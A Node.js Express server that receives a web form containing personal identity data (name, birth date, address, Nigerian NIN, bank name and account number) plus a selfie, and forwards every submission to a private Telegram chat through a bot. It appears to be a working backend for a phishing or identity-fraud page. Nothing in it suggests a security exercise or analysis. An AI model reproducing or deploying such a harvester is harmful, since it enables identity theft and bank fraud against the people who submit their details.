const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Configure multer for file uploads with more permissive settings
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        const uploadDir = './uploads';
        if (!fs.existsSync(uploadDir)) {
            fs.mkdirSync(uploadDir, { recursive: true });
        }
        cb(null, uploadDir);
    },
    filename: function (req, file, cb) {
        // Keep original extension
        const ext = path.extname(file.originalname);
        cb(null, Date.now() + '-' + Math.round(Math.random() * 1E9) + ext);
    }
});

const upload = multer({ 
    storage: storage,
    limits: {
        fileSize: 5 * 1024 * 1024 // 5MB limit
    },
    fileFilter: function (req, file, cb) {
        // Accept images only
        if (!file.originalname.match(/\.(jpg|jpeg|png|gif|webp)$/i)) {
            return cb(new Error('Only image files are allowed!'), false);
        }
        cb(null, true);
    }
});

// Middleware - important for file uploads
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Function to send text message to Telegram
async function sendTextToTelegram(text) {
    try {
        const response = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            }
        );
        return response.data;
    } catch (error) {
        console.error('Error sending text to Telegram:', error.message);
        throw error;
    }
}

// Function to send photo to Telegram
async function sendPhotoToTelegram(photoPath, caption = '') {
    try {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', fs.createReadStream(photoPath));
        if (caption) {
            formData.append('caption', caption);
        }

        const response = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
            formData,
            {
                headers: {
                    ...formData.getHeaders()
                }
            }
        );
        
        // Clean up the uploaded file
        fs.unlinkSync(photoPath);
        
        return response.data;
    } catch (error) {
        console.error('Error sending photo to Telegram:', error.message);
        // Clean up file even if there's an error
        if (fs.existsSync(photoPath)) {
            fs.unlinkSync(photoPath);
        }
        throw error;
    }
}

// Express.js example
app.get('/api/data', async (req, res) => {
  try { 
    res.json({
      status: 'ready',
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    res.status(503).json({
      status: 'error',
      error: 'Service unavailable'
    });
  }
});

// Main form submission endpoint
app.post('/api/data', upload.single('selfie'), async (req, res) => {
    console.log('Form submission received');
    console.log('Request body:', req.body);
    console.log('Request file:', req.file);
    
        const { name, gender, dob, email, employ, phone, marital, city, state, address, lga, nin, bankName, accountNumber, accountName} = req.body;
        const selfieFile = req.file;

const lines = ['📋 <b>New Form Submission</b>'];
    
if (name) lines.push(`<b>Name:</b> ${name}`);
if (gender) lines.push(`<b>Gender:</b> ${gender}`);
if (dob) lines.push(`<b>Date of Birth:</b> ${dob}`);
if (email) lines.push(`<b>Email:</b> ${email}`);
if (employ) lines.push(`<b>Employment Status:</b> ${employ}`);
if (phone) lines.push(`<b>Phone:</b> ${phone}`);
if (marital) lines.push(`<b>Marital Status:</b> ${marital}`);
if (city) lines.push(`<b>City:</b> ${city}`);
if (state) lines.push(`<b>State:</b> ${state}`);
if (address) lines.push(`<b>Address:</b> ${address}`);
if (lga) lines.push(`<b>Local Government Area:</b> ${lga}`);
if (nin) lines.push(`<b>NIN:</b> ${nin}`);
if (bankName) lines.push(`<b>Bank Name:</b> ${bankName}`);
if (accountNumber) lines.push(`<b>Account Number:</b> ${accountNumber}`);
if (accountName) lines.push(`<b>Account Name:</b> ${accountName}`);
   lines.push(`🕒 <b>Submitted at:</b> ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}`);
    
        // Format text data for Telegram
        const formattedText = lines.join('\n').trim();

        // Send text data to Telegram
        await sendTextToTelegram(formattedText);

    res.json({ 
            success: true, 
            message: 'Form submitted and data sent to Telegram successfully' 
    });   
    
    // Send selfie to Telegram with a caption if there is one
        if (selfieFile) {
            const caption = `📸 Selfie from: ${name}`;
          sendPhotoToTelegram(selfieFile.path, caption);
        }
});

// Error handling middleware
app.use((error, req, res, next) => {
    if (error instanceof multer.MulterError) {
        if (error.code === 'LIMIT_FILE_SIZE') {
            return res.status(400).json({
                error: 'File too large',
                details: 'File size must be less than 5MB'
            });
        }
    }
    res.status(500).json({
        error: 'Internal server error',
        details: error.message
    });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
